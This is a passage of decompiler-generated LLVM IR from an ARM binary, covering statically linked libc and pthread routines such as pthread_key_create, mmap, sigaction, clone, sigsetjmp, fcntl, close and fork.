  br i1 %v2_fc28, label %dec_label_pc_fc30, label %dec_label_pc_fc48

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fc20, %entry
  store i32 ptrtoint (i32* @global_var_2de90.535 to i32), i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* %r3.global-to-local, align 4
  store i32 64576, i32* %lr.global-to-local, align 4
  %v1_fc3c = call i32 @pthread_mutex_unlock()
  ret i32 22

dec_label_pc_fc48:                                ; preds = %dec_label_pc_fc20
  %v2_fc4c = load i32, i32* @global_var_2b484.197, align 4
  %v7_fc54 = icmp eq i32 %v2_fc4c, -1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fc5c = add i32 %v4_fc24, add (i32 ptrtoint (i32* @global_var_2be90.530 to i32), i32 4)
  %v3_fc5c = inttoptr i32 %v2_fc5c to i32*
  store i32 0, i32* %v3_fc5c, align 4
  %v0_fc60 = load i32, i32* %r3.global-to-local, align 4
  %v1_fc60 = load i32, i32* %r1.global-to-local, align 4
  %v2_fc60 = load i32, i32* @r4, align 4
  %v5_fc60 = mul i32 %v2_fc60, 8
  %v6_fc60 = add i32 %v5_fc60, %v1_fc60
  %v7_fc60 = inttoptr i32 %v6_fc60 to i32*
  store i32 %v0_fc60, i32* %v7_fc60, align 4
  br i1 %v7_fc54, label %dec_label_pc_fca0, label %dec_label_pc_fc68

dec_label_pc_fc68:                                ; preds = %dec_label_pc_fc48
  %v0_fc68 = call i32 @_thread_self.12()
  %v0_fc6c = load i32, i32* @r4, align 4
  %v1_fc6c = urem i32 %v0_fc6c, 32
  store i32 %v1_fc6c, i32* %lr.global-to-local, align 4
  %v3_fc70 = udiv i32 %v0_fc6c, 32
  store i32 %v3_fc70, i32* %ip.global-to-local, align 4
  store i32 %v0_fc68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc78

dec_label_pc_fc78:                                ; preds = %.dec_label_pc_fc78_crit_edge, %dec_label_pc_fc68
  %v1_fc80 = phi i32 [ %v1_fc80.pre, %.dec_label_pc_fc78_crit_edge ], [ %v3_fc70, %dec_label_pc_fc68 ]
  %v0_fc80 = phi i32 [ %v2_fc94, %.dec_label_pc_fc78_crit_edge ], [ %v0_fc68, %dec_label_pc_fc68 ]
  %v1_fc78 = add i32 %v0_fc80, 44
  %v2_fc78 = inttoptr i32 %v1_fc78 to i8*
  %v3_fc78 = load i8, i8* %v2_fc78, align 1
  %v4_fc78 = zext i8 %v3_fc78 to i32
  store i32 %v4_fc78, i32* %r1.global-to-local, align 4
  %v2_fc7c = icmp eq i8 %v3_fc78, 0
  br i1 %v2_fc7c, label %dec_label_pc_fc88, label %bb6

dec_label_pc_fc88:                                ; preds = %dec_label_pc_fc78
  %v4_fc80 = mul i32 %v1_fc80, 4
  %v5_fc80 = add i32 %v4_fc80, %v0_fc80
  %v1_fc88 = add i32 %v5_fc80, 236
  %v2_fc88 = inttoptr i32 %v1_fc88 to i32*
  %v3_fc88 = load i32, i32* %v2_fc88, align 4
  %v2_fc8c = icmp eq i32 %v3_fc88, 0
  br i1 %v2_fc8c, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_fc88
  %v3_fc90 = load i32, i32* %lr.global-to-local, align 4
  %v6_fc90 = mul i32 %v3_fc90, 4
  %v7_fc90 = add i32 %v6_fc90, %v3_fc88
  %v8_fc90 = inttoptr i32 %v7_fc90 to i32*
  store i32 %v4_fc78, i32* %v8_fc90, align 4
  %v0_fc94.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_fc78, %dec_label_pc_fc88, %bb
  %v0_fc94 = phi i32 [ %v0_fc80, %dec_label_pc_fc78 ], [ %v0_fc80, %dec_label_pc_fc88 ], [ %v0_fc94.pre, %bb ]
  %v1_fc94 = inttoptr i32 %v0_fc94 to i32*
  %v2_fc94 = load i32, i32* %v1_fc94, align 4
  store i32 %v2_fc94, i32* %r3.global-to-local, align 4
  %v9_fc98 = icmp eq i32 %v2_fc94, %v0_fc68
  br i1 %v9_fc98, label %dec_label_pc_fca0, label %.dec_label_pc_fc78_crit_edge

.dec_label_pc_fc78_crit_edge:                     ; preds = %bb6
  %v1_fc80.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fc78

dec_label_pc_fca0:                                ; preds = %bb6, %dec_label_pc_fc48
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2de90.535 to i32), i32* @r0, align 4
  store i32 64688, i32* %lr.global-to-local, align 4
  %v1_fcac = call i32 @pthread_mutex_unlock()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_fc94, { 1, 2, 0 }
  uselistorder i32 %v3_fc70, { 1, 0 }
  uselistorder i32 %v0_fc68, { 1, 0, 2 }
  uselistorder i32 236, { 2, 3, 1, 0, 5, 6, 4 }
  uselistorder i32 ()* @_thread_self.12, { 5, 4, 0, 3, 1, 2, 6 }
  uselistorder i32* @global_var_2b484.197, { 3, 4, 5, 0, 6, 1, 7, 8, 9, 10, 11, 2, 12, 13, 21, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder label %bb6, { 2, 1, 0 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_fce4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2de90.535 to i32))
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2be90.530 to i32), i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fcf0

dec_label_pc_fcf0:                                ; preds = %entry, %dec_label_pc_fd28
  %v1_fcfc = phi i32 [ 0, %entry ], [ %v1_fd28, %dec_label_pc_fd28 ]
  %v4_fcf0 = mul nuw nsw i32 %v1_fcfc, 8
  %v5_fcf0 = add i32 %v4_fcf0, ptrtoint (i32* @global_var_2be90.530 to i32)
  %v6_fcf0 = inttoptr i32 %v5_fcf0 to i32*
  %v7_fcf0 = load i32, i32* %v6_fcf0, align 4
  store i32 %v7_fcf0, i32* @r5, align 4
  %v2_fcf4 = icmp eq i32 %v7_fcf0, 0
  br i1 %v2_fcf4, label %dec_label_pc_fcfc, label %dec_label_pc_fd28

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fcf0
  %v0_fd00 = load i32, i32* @r6, align 4
  %v2_fd00 = add i32 %v4_fcf0, add (i32 ptrtoint (i32* @global_var_2be90.530 to i32), i32 4)
  %v3_fd00 = inttoptr i32 %v2_fd00 to i32*
  store i32 %v0_fd00, i32* %v3_fd00, align 4
  %v1_fd08 = load i32, i32* %r2.global-to-local, align 4
  %v2_fd08 = load i32, i32* @r4, align 4
  %v5_fd08 = mul i32 %v2_fd08, 8
  %v6_fd08 = add i32 %v5_fd08, %v1_fd08
  %v7_fd08 = inttoptr i32 %v6_fd08 to i32*
  store i32 1, i32* %v7_fd08, align 4
  store i32 ptrtoint (i32* @global_var_2de90.535 to i32), i32* @r0, align 4
  %v1_fd18 = call i32 @pthread_mutex_unlock()
  %v0_fd1c = load i32, i32* @r5, align 4
  %v0_fd20 = load i32, i32* @r4, align 4
  %v1_fd20 = load i32, i32* @r7, align 4
  %v2_fd20 = inttoptr i32 %v1_fd20 to i32*
  store i32 %v0_fd20, i32* %v2_fd20, align 4
  ret i32 %v0_fd1c

dec_label_pc_fd28:                                ; preds = %dec_label_pc_fcf0
  %v1_fd28 = add nuw nsw i32 %v1_fcfc, 1
  store i32 %v1_fd28, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2be90.530 to i32), i32* %r2.global-to-local, align 4
  %v5_fd34 = icmp slt i32 %v1_fd28, 1024
  br i1 %v5_fd34, label %dec_label_pc_fcf0, label %dec_label_pc_fd38

dec_label_pc_fd38:                                ; preds = %dec_label_pc_fd28
  store i32 ptrtoint (i32* @global_var_2de90.535 to i32), i32* @r0, align 4
  %v1_fd44 = call i32 @pthread_mutex_unlock()
  ret i32 11

; uselistorder directives
  uselistorder i32 %v1_fd28, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2be90.530 to i32), { 6, 2, 1, 3, 7, 4, 0, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_2de90.535 to i32), { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_fcf0, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_fd60 = load i32, i32* @r4, align 4
  store i32 %v3_fd60, i32* %stack_var_-12, align 4
  %v3_fd6c = urem i32 %arg3, 4096
  %v2_fd70 = icmp eq i32 %v3_fd6c, 0
  store i32 %arg2, i32* %r4.global-to-local, align 4
  br i1 %v2_fd70, label %dec_label_pc_fd94, label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %entry
  %v0_fd80 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_fd8c = inttoptr i32 %v0_fd80 to i32*
  store i32 22, i32* %v2_fd8c, align 4
  %v0_fdb8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fdb8

dec_label_pc_fd94:                                ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fdb4, label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fd94
  %v0_fda4 = call i32 @__errno_location()
  %v0_fda8 = load i32, i32* %r4.global-to-local, align 4
  %v1_fda8 = sub i32 0, %v0_fda8
  %v2_fdac = inttoptr i32 %v0_fda4 to i32*
  store i32 %v1_fda8, i32* %v2_fdac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fdb4

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fd94, %dec_label_pc_fda4
  %v0_fdb4 = phi i32 [ %arg1, %dec_label_pc_fd94 ], [ -1, %dec_label_pc_fda4 ]
  store i32 %v0_fdb4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fd80, %dec_label_pc_fdb4
  %v0_fdb8 = phi i32 [ %v0_fdb8.pre, %dec_label_pc_fd80 ], [ %v0_fdb4, %dec_label_pc_fdb4 ]
  %v2_fdbc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fdbc, i32* @r4, align 4
  ret i32 %v0_fdb8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fdb8, { 1, 0 }
  uselistorder label %dec_label_pc_fdb4, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_fdc0 = load i32, i32* @r4, align 4
  %v6_fdc0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_fdc4 = icmp eq i32* %arg2, null
  %v2_fdc8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_fdc4, label %dec_label_pc_fe34, label %dec_label_pc_fdd8

dec_label_pc_fdd8:                                ; preds = %entry
  %v2_fddc = load i32, i32* %arg2, align 4
  %v4_fddc = add i32 %tmp, 4
  store i32 %v4_fddc, i32* @r1, align 4
  %v2_fde0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_fde0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_fddc, i32* %stack_var_-156, align 4
  %v0_fdec = call i32 @memcpy()
  store i32 %v0_fdec, i32* %r0.global-to-local, align 4
  %v0_fdf0 = load i32, i32* @r4, align 4
  %v1_fdf0 = add i32 %v0_fdf0, 132
  %v2_fdf0 = inttoptr i32 %v1_fdf0 to i32*
  %v3_fdf0 = load i32, i32* %v2_fdf0, align 4
  %v1_fdf4 = and i32 %v3_fdf0, 67108864
  %v2_fdf4 = icmp eq i32 %v1_fdf4, 0
  br i1 %v2_fdf4, label %dec_label_pc_fe08, label %bb

bb:                                               ; preds = %dec_label_pc_fdd8
  br label %dec_label_pc_fe24

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fdd8
  %v1_fe10 = and i32 %v3_fdf0, 4
  %v2_fe10 = icmp eq i32 %v1_fe10, 0
  br i1 %v2_fe10, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_fe08
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_fe08, %bb20
  br label %dec_label_pc_fe24

dec_label_pc_fe24:                                ; preds = %bb, %bb21
  %v2_fe24 = icmp eq i32 %v0_fdf0, 0
  %v3_fe28 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_fe28 = select i1 %v2_fe24, i32 0, i32 %v3_fe28
  %v0_fe34.pre = load i32, i32* @r5, align 4
  %v0_fe44.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fe34

dec_label_pc_fe34:                                ; preds = %dec_label_pc_fe24, %entry
  %v0_fe44 = phi i32 [ %arg1, %entry ], [ %v0_fe44.pre, %dec_label_pc_fe24 ]
  %v0_fe34 = phi i32 [ %arg3, %entry ], [ %v0_fe34.pre, %dec_label_pc_fe24 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_fe28, %dec_label_pc_fe24 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_fe34 = icmp eq i32 %v0_fe34, 0
  %.v2_fdc8 = select i1 %v2_fe34, i32 0, i32 %v2_fdc8
  store i32 %.v2_fdc8, i32* @r2, align 4
  store i32 %v0_fe44, i32* %r0.global-to-local, align 4
  %v1_fe48 = call i32 @__syscall_rt_sigaction(i32 %v0_fe44)
  store i32 %v1_fe48, i32* %r0.global-to-local, align 4
  %v0_fe4c = load i32, i32* @r5, align 4
  %v2_fe4c = icmp eq i32 %v0_fe4c, 0
  br i1 %v2_fe4c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_fe34
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_fe34, %bb25
  %v0_fe5c.pr = phi i32 [ 0, %dec_label_pc_fe34 ], [ 1, %bb25 ]
  %v1_fe54 = icmp slt i32 %v1_fe48, 0
  br i1 %v1_fe54, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_fe90

thread-pre-split:                                 ; preds = %bb26
  %v2_fe5c = icmp eq i32 %v0_fe5c.pr, 0
  store i32 %v1_fe48, i32* @r4, align 4
  br i1 %v2_fe5c, label %dec_label_pc_fe90, label %dec_label_pc_fe68

dec_label_pc_fe68:                                ; preds = %thread-pre-split
  %v2_fe68 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_fe4c, i32* %r0.global-to-local, align 4
  %v2_fe70 = inttoptr i32 %v0_fe4c to i32*
  store i32 %v2_fe68, i32* %v2_fe70, align 4
  %v3_fe70 = load i32, i32* %r0.global-to-local, align 4
  %v4_fe70 = add i32 %v3_fe70, 4
  store i32 %v4_fe70, i32* @r0, align 4
  %v2_fe74 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_fe74, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_fe7c = call i32 @memcpy()
  store i32 %v0_fe7c, i32* %r0.global-to-local, align 4
  %v1_fe84 = load i32, i32* @r5, align 4
  %v2_fe84 = add i32 %v1_fe84, 136
  %v3_fe84 = inttoptr i32 %v2_fe84 to i32*
  %v1_fe8c = load i32, i32* @r5, align 4
  %v2_fe8c = add i32 %v1_fe8c, 132
  %v3_fe8c = inttoptr i32 %v2_fe8c to i32*
  %v0_fe90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fe90

dec_label_pc_fe90:                                ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_fe68
  %v0_fe90 = phi i32 [ %v1_fe48, %thread-pre-split ], [ %v0_fe90.pre, %dec_label_pc_fe68 ], [ %v1_fe48, %thread-pre-split.thread ]
  store i32 %v0_fe90, i32* %r0.global-to-local, align 4
  store i32 %v3_fdc0, i32* @r4, align 4
  store i32 %v6_fdc0, i32* @r5, align 4
  ret i32 %v0_fe90

; uselistorder directives
  uselistorder i32 %v0_fe90, { 1, 0 }
  uselistorder i32 %v0_fe4c, { 1, 0, 2 }
  uselistorder i32 %v0_fe44, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_fe90, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_fe24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @clone(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_fea4 = icmp eq i32 %arg1, 0
  br i1 %v2_fea4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_fea8 = icmp eq i32 %arg2, 0
  br i1 %v3_fea8, label %.thread2, label %dec_label_pc_feb4

.thread2:                                         ; preds = %bb
  store i32 -22, i32* @r0, align 4
  br label %dec_label_pc_fee4

bb4:                                              ; preds = %entry
  store i32 -22, i32* @r0, align 4
  br label %dec_label_pc_fee4

dec_label_pc_feb4:                                ; preds = %bb
  %v1_feb4 = add i32 %arg2, -8
  %v0_feb8 = load i32, i32* @r3, align 4
  %v2_feb8 = add i32 %arg2, -4
  %v3_feb8 = inttoptr i32 %v2_feb8 to i32*
  store i32 %v0_feb8, i32* %v3_feb8, align 4
  %v0_febc = load i32, i32* %r0.global-to-local, align 4
  %v2_febc = inttoptr i32 %v1_feb4 to i32*
  store i32 %v0_febc, i32* %v2_febc, align 4
  %v0_fec0 = load i32, i32* @r2, align 4
  store i32 %v0_fec0, i32* %r0.global-to-local, align 4
  %v2_fec4 = call i32 @clone(i32 %v0_fec0, i32 %v1_feb4)
  store i32 %v2_fec4, i32* @r0, align 4
  %v1_fec8 = icmp slt i32 %v2_fec4, 0
  %v1_fecc = load i1, i1* @cpsr_v, align 1
  %v2_fecc = xor i1 %v1_fec8, %v1_fecc
  br i1 %v2_fecc, label %dec_label_pc_fee4, label %dec_label_pc_fed0

dec_label_pc_fed0:                                ; preds = %dec_label_pc_feb4
  %v2_fec8 = icmp eq i32 %v2_fec4, 0
  br i1 %v2_fec8, label %bb6, label %bb5

bb5:                                              ; preds = %dec_label_pc_fed0
  ret i32 %v2_fec4

bb6:                                              ; preds = %dec_label_pc_fed0
  store i32 ptrtoint (i32* @global_var_fee0.547 to i32), i32* @lr, align 4
  %v3_fedc = call i32 @unknown_0()
  store i32 %v3_fedc, i32* %r0.global-to-local, align 4
  %v1_fee0 = call i32 @__GI__exit(i32 %v3_fedc)
  unreachable

dec_label_pc_fee4:                                ; preds = %bb4, %.thread2, %dec_label_pc_feb4
  %v0_fee4 = call i32 @__syscall_error()
  store i32 %v0_fee4, i32* %r0.global-to-local, align 4
  ret i32 %v0_fee4

; uselistorder directives
  uselistorder i32 %v2_fec4, { 0, 3, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @clone, { 4, 1, 0, 3, 2 }
  uselistorder i32 -22, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fee4, { 2, 0, 1 }
}

define i32 @__sigsetjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_0 = alloca i32, align 4
  %v2_feec = load i32, i32* @r4, align 4
  store i32 %v2_feec, i32* %arg1, align 4
  %v3_feec = add i32 %tmp, 4
  %v4_feec = inttoptr i32 %v3_feec to i32*
  %v5_feec = load i32, i32* @r5, align 4
  store i32 %v5_feec, i32* %v4_feec, align 4
  %v6_feec = add i32 %tmp, 8
  %v7_feec = inttoptr i32 %v6_feec to i32*
  %v8_feec = load i32, i32* @r6, align 4
  store i32 %v8_feec, i32* %v7_feec, align 4
  %v9_feec = add i32 %tmp, 12
  %v10_feec = inttoptr i32 %v9_feec to i32*
  %v11_feec = load i32, i32* @r7, align 4
  store i32 %v11_feec, i32* %v10_feec, align 4
  %v12_feec = add i32 %tmp, 16
  %v13_feec = inttoptr i32 %v12_feec to i32*
  %v14_feec = load i32, i32* @r8, align 4
  store i32 %v14_feec, i32* %v13_feec, align 4
  %v15_feec = add i32 %tmp, 20
  %v16_feec = inttoptr i32 %v15_feec to i32*
  %v17_feec = load i32, i32* @sb, align 4
  store i32 %v17_feec, i32* %v16_feec, align 4
  %v18_feec = add i32 %tmp, 24
  %v19_feec = inttoptr i32 %v18_feec to i32*
  %v20_feec = load i32, i32* @sl, align 4
  store i32 %v20_feec, i32* %v19_feec, align 4
  %v21_feec = add i32 %tmp, 28
  %v22_feec = inttoptr i32 %v21_feec to i32*
  %v23_feec = load i32, i32* @fp, align 4
  store i32 %v23_feec, i32* %v22_feec, align 4
  %v24_feec = add i32 %tmp, 32
  %v25_feec = inttoptr i32 %v24_feec to i32*
  %v27_feec = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_feec, i32* %v25_feec, align 4
  %v28_feec = add i32 %tmp, 36
  %v29_feec = inttoptr i32 %v28_feec to i32*
  %v30_feec = load i32, i32* @lr, align 4
  store i32 %v30_feec, i32* %v29_feec, align 4
  %v0_fef0 = call i32 @__sigjmp_save()
  ret i32 %v0_fef0

; uselistorder directives
  uselistorder i32 %tmp, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_fef4 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_fef4
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_fef8 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_fef8
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_ff0c = add i32 %arg1, -12
  store i32 %arg2, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_ff0c, 2
  br i1 %tmp, label %dec_label_pc_ff34, label %dec_label_pc_ff2c

dec_label_pc_ff2c:                                ; preds = %entry
  %v0_ff2c = call i32 @__GI_fcntl64()
  br label %dec_label_pc_ff60

dec_label_pc_ff34:                                ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_ff3c = call i32 @fcntl()
  store i32 %v0_ff3c, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v0_ff3c, -4095
  br i1 %tmp8, label %dec_label_pc_ff60, label %dec_label_pc_ff4c

dec_label_pc_ff4c:                                ; preds = %dec_label_pc_ff34
  %v0_ff4c = call i32 @__errno_location()
  %v0_ff50 = load i32, i32* %r4.global-to-local, align 4
  %v1_ff50 = sub i32 0, %v0_ff50
  %v2_ff54 = inttoptr i32 %v0_ff4c to i32*
  store i32 %v1_ff50, i32* %v2_ff54, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ff60

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff4c, %dec_label_pc_ff34, %dec_label_pc_ff2c
  %storemerge = phi i32 [ %v0_ff2c, %dec_label_pc_ff2c ], [ %v0_ff3c, %dec_label_pc_ff34 ], [ -1, %dec_label_pc_ff4c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_ff3c, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_ff90 = load i32, i32* @r0, align 4
  store i32 %v0_ff90, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ff90, -4095
  br i1 %tmp, label %dec_label_pc_ffac, label %dec_label_pc_ff9c

dec_label_pc_ff9c:                                ; preds = %entry
  %v0_ff9c = call i32 @__errno_location()
  %v0_ffa0 = load i32, i32* %r4.global-to-local, align 4
  %v1_ffa0 = sub i32 0, %v0_ffa0
  %v2_ffa4 = inttoptr i32 %v0_ff9c to i32*
  store i32 %v1_ffa0, i32* %v2_ffa4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %entry, %dec_label_pc_ff9c
  %v0_ffac = phi i32 [ %v0_ff90, %entry ], [ -1, %dec_label_pc_ff9c ]
  ret i32 %v0_ffac

; uselistorder directives
  uselistorder i32 %v0_ff90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ffac, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ffc0 = load i32, i32* @r4, align 4
  store i32 %v3_ffc0, i32* %stack_var_-8, align 4
  %v1_ffc4 = load i32, i32* @r1, align 4
  %v2_ffc4 = inttoptr i32 %v1_ffc4 to %sigaction*
  %v3_ffc4 = load i32, i32* @r2, align 4
  %v4_ffc4 = inttoptr i32 %v3_ffc4 to %sigaction*
  %v5_ffc4 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_ffc4, %sigaction* %v4_ffc4)
  store i32 %v5_ffc4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_ffc4, -4095
  br i1 %tmp, label %dec_label_pc_ffe4, label %dec_label_pc_ffd4

dec_label_pc_ffd4:                                ; preds = %entry
  %v0_ffd4 = call i32 @__errno_location()
  %v0_ffd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_ffd8 = sub i32 0, %v0_ffd8
  %v2_ffdc = inttoptr i32 %v0_ffd4 to i32*
  store i32 %v1_ffd8, i32* %v2_ffdc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ffe4

dec_label_pc_ffe4:                                ; preds = %entry, %dec_label_pc_ffd4
  %v0_ffe4 = phi i32 [ %v5_ffc4, %entry ], [ -1, %dec_label_pc_ffd4 ]
  %v2_ffe8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ffe8, i32* %r4.global-to-local, align 4
  ret i32 %v0_ffe4

; uselistorder directives
  uselistorder i32 %v5_ffc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ffe4, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10014 = load i32, i32* @r4, align 4
  store i32 %v3_10014, i32* %stack_var_-8, align 4
  %v0_10018 = call i32 @close()
  store i32 %v0_10018, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10018, -4095
  br i1 %tmp, label %dec_label_pc_10038, label %dec_label_pc_10028

dec_label_pc_10028:                               ; preds = %entry
  %v0_10028 = call i32 @__errno_location()
  %v0_1002c = load i32, i32* %r4.global-to-local, align 4
  %v1_1002c = sub i32 0, %v0_1002c
  %v2_10030 = inttoptr i32 %v0_10028 to i32*
  store i32 %v1_1002c, i32* %v2_10030, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10038

dec_label_pc_10038:                               ; preds = %entry, %dec_label_pc_10028
  %v0_10038 = phi i32 [ %v0_10018, %entry ], [ -1, %dec_label_pc_10028 ]
  %v2_1003c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1003c, i32* @r4, align 4
  ret i32 %v0_10038

; uselistorder directives
  uselistorder i32 %v0_10018, { 1, 0, 2 }
  uselistorder i32 ()* @close, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10038, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10040 = load i32, i32* @r4, align 4
  store i32 %v3_10040, i32* %stack_var_-8, align 4
  %v0_10044 = call i32 @fork()
  store i32 %v0_10044, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10044, -4095
  br i1 %tmp, label %dec_label_pc_10064, label %dec_label_pc_10054

dec_label_pc_10054:                               ; preds = %entry
  %v0_10054 = call i32 @__errno_location()
  %v0_10058 = load i32, i32* %r4.global-to-local, align 4
  %v1_10058 = sub i32 0, %v0_10058
  %v2_1005c = inttoptr i32 %v0_10054 to i32*
  store i32 %v1_10058, i32* %v2_1005c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10064

dec_label_pc_10064:                               ; preds = %entry, %dec_label_pc_10054
